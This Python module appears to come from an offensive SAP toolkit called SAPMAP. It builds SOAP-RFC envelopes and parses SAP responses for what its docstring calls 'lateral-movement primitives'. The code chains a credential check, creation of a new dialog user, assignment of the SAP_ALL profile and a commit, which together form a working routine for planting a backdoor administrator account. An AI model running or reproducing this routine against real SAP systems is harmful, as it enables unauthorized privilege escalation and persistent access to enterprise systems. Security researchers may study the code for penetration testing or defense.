"""SOAP envelope builders + response parser for SAP SOAP-RFC.

SAP exposes every RFC-enabled function module at /sap/bc/soap/rfc as a SOAP
operation in the urn:sap-com:document:sap:rfc:functions namespace.  This
module produces the request envelopes we need for the Phase 3a lateral-
movement primitives:

    RFC_PING                       — connectivity / credential check
    BAPI_USER_CREATE1              — create the local user
    BAPI_USER_PROFILES_ASSIGN      — grant SAP_ALL
    BAPI_TRANSACTION_COMMIT        — persist (BAPIs do not auto-commit)

The parser handles three response shapes:
 1. Success: <FM_NAME>.Response with OUT params, structures and tables.
 2. BAPI logical error: success-looking response, but RETURN table has
    rows with TYPE='E'/'A'/'X' — we surface those in `error`.
 3. SOAP fault: the SAP kernel returns an HTTP 500 with a SOAP fault for
    SYSTEM_FAILURE, RFC_AUTHORIZATION_FAILURE etc.

Kept dependency-free (stdlib ElementTree + xml.sax.saxutils.escape) so
the rest of SAPMAP doesn't need a SOAP library just to call four FMs.
"""
from __future__ import annotations

from xml.etree import ElementTree as ET
from xml.sax.saxutils import escape as _xml_escape

_NS_RFC = "urn:sap-com:document:sap:rfc:functions"
_NS_SOAP = "http://schemas.xmlsoap.org/soap/envelope/"

# Strictest XML escaping: also encode " and '.  Passwords routinely
# contain quotes; left unescaped they don't break ABAP, but make the
# resulting envelope fragile to copy/paste debugging and (in some
# kernels) interact badly with attribute-style parsing.
_XML_ENTITIES = {'"': '&quot;', "'": '&apos;'}


def escape(s: str) -> str:
    return _xml_escape(s, _XML_ENTITIES)


def _wrap_envelope(body_xml: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<soapenv:Envelope '
        f'xmlns:soapenv="{_NS_SOAP}" '
        f'xmlns:urn="{_NS_RFC}">'
        '<soapenv:Header/>'
        f'<soapenv:Body>{body_xml}</soapenv:Body>'
        '</soapenv:Envelope>'
    )


# ---------------------------------------------------------------------------
# Builders
# ---------------------------------------------------------------------------

def build_rfc_ping() -> str:
    """RFC_PING has no parameters; a successful response means the
    credentials passed authentication and the function group is callable."""
    return _wrap_envelope("<urn:RFC_PING/>")


def build_bapi_user_create1(username: str, password: str,
                            firstname: str = "SAPMAP",
                            lastname: str = "Tool",
                            user_type: str = "A") -> str:
    """BAPI_USER_CREATE1 — create a user with a logon password.

    USTYP='A' (dialog) so the user can be used for interactive RFC.
    Caller is expected to also call BAPI_USER_PROFILES_ASSIGN and
    BAPI_TRANSACTION_COMMIT — none of which auto-commit.
    """
    body = (
        '<urn:BAPI_USER_CREATE1>'
        f'<USERNAME>{escape(username)}</USERNAME>'
        '<PASSWORD>'
        f'<BAPIPWD>{escape(password)}</BAPIPWD>'
        '</PASSWORD>'
        '<ADDRESS>'
        f'<FIRSTNAME>{escape(firstname)}</FIRSTNAME>'
        f'<LASTNAME>{escape(lastname)}</LASTNAME>'
        '</ADDRESS>'
        '<LOGONDATA>'
        f'<USTYP>{escape(user_type)}</USTYP>'
        '</LOGONDATA>'
        '</urn:BAPI_USER_CREATE1>'
    )
    return _wrap_envelope(body)


def build_bapi_user_profiles_assign(username: str,
                                    profiles: list) -> str:
    """BAPI_USER_PROFILES_ASSIGN — overwrite the profile list.

    Note: this REPLACES the user's profile assignment.  Pass ['SAP_ALL']
    for the SAPMAP elevation path; pre-existing profiles on the user
    will be removed.  For new users (just created) that's the desired
    behaviour.
    """
    items = "".join(
        f'<item><BAPIPROF>{escape(p)}</BAPIPROF></item>'
        for p in profiles
    )
    body = (
        '<urn:BAPI_USER_PROFILES_ASSIGN>'
        f'<USERNAME>{escape(username)}</USERNAME>'
        f'<PROFILES>{items}</PROFILES>'
        '</urn:BAPI_USER_PROFILES_ASSIGN>'
    )
    return _wrap_envelope(body)


def build_bapi_transaction_commit(wait: bool = True) -> str:
    """BAPI_TRANSACTION_COMMIT — flush pending updates.

    WAIT='X' makes the COMMIT WORK synchronous (V1 update finishes
    before the call returns), which we want so subsequent BAPIs see
    the user.  WAIT='' is async.
    """
    body = (
        '<urn:BAPI_TRANSACTION_COMMIT>'
        f'<WAIT>{"X" if wait else ""}</WAIT>'
        '</urn:BAPI_TRANSACTION_COMMIT>'
    )
    return _wrap_envelope(body)


# ---------------------------------------------------------------------------
# Response parser
# ---------------------------------------------------------------------------

def _localname(tag: str) -> str:
    """Strip XML namespace from a tag, returning the local element name."""
    return tag.split("}", 1)[1] if "}" in tag else tag


def parse_response(xml_str: str, fm_name: str) -> dict:
    """Parse a SOAP-RFC response into a structured dict.

    Returns:
      {
        "ok":     bool,         True when no fault and no E/A/X in RETURN
        "params": dict,         scalar OUT params + OUT structures
        "tables": dict,         OUT/CHANGING tables, each is list[dict]
        "error":  str,          empty on success, otherwise human-readable
        "raw":    str,          original response body (for debugging)
      }

    For BAPI calls the RETURN table is the canonical error channel —
    any row with TYPE='E'/'A'/'X' fails the call.  S (success) and
    W (warning) leave ok=True.
    """
    result = {
        "ok": False, "params": {}, "tables": {},
        "error": "", "raw": xml_str,
    }

    try:
        root = ET.fromstring(xml_str)
    except ET.ParseError as e:
        result["error"] = f"XML parse error: {e}"
        return result

    # SOAP fault → transport/auth error
    for elem in root.iter():
        if _localname(elem.tag) == "Fault":
            code = ""
            string = ""
            for child in elem:
                lname = _localname(child.tag)
                if lname == "faultcode":
                    code = (child.text or "").strip()
                elif lname == "faultstring":
                    string = (child.text or "").strip()
            result["error"] = (
                f"SOAP fault: {code} - {string}".strip(" -"))
            return result

    # Find the FM response element
    expected = f"{fm_name}.Response"
    response_elem = None
    for elem in root.iter():
        if _localname(elem.tag) == expected:
            response_elem = elem
            break

    if response_elem is None:
        # Some kernels return the response without the .Response suffix
        # (a SAP cloud variant).  Fall back to looking for the FM name.
        for elem in root.iter():
            if _localname(elem.tag) == fm_name:
                response_elem = elem
                break

    if response_elem is None:
        first_tags = [_localname(e.tag) for e in root.iter()][:8]
        result["error"] = (
            f"No <{expected}> in response body. "
            f"Saw: {first_tags}")
        return result

    # Walk the response element: split into params (scalars + structures)
    # and tables (anything with <item> children).
    for child in response_elem:
        tag = _localname(child.tag)
        sub_elements = list(child)
        items = [c for c in sub_elements if _localname(c.tag) == "item"]
        if items:
            rows = []
            for item in items:
                row = {}
                for field in item:
                    row[_localname(field.tag)] = (field.text or "")
                rows.append(row)
            result["tables"][tag] = rows
        elif sub_elements:
            # Structure
            struct = {}
            for field in sub_elements:
                struct[_localname(field.tag)] = (field.text or "")
            result["params"][tag] = struct
        else:
            result["params"][tag] = (child.text or "")

    # BAPI RETURN table inspection.  RETURN may also appear as a single
    # structure (not wrapped in <item>) when the kernel uses the "BAPIRET2
    # structure" form — handle both.
    return_rows = result["tables"].get("RETURN", [])
    if not return_rows and isinstance(
            result["params"].get("RETURN"), dict):
        return_rows = [result["params"]["RETURN"]]

    bapi_errors = []
    for row in return_rows:
        if row.get("TYPE", "") in ("E", "A", "X"):
            bapi_errors.append(
                f"{row.get('TYPE')} "
                f"{row.get('ID', '')}"
                f"{row.get('NUMBER', '')}: "
                f"{row.get('MESSAGE', '').strip()}"
            )

    if bapi_errors:
        result["error"] = "; ".join(bapi_errors)
        result["ok"] = False
    else:
        result["ok"] = True

    return result
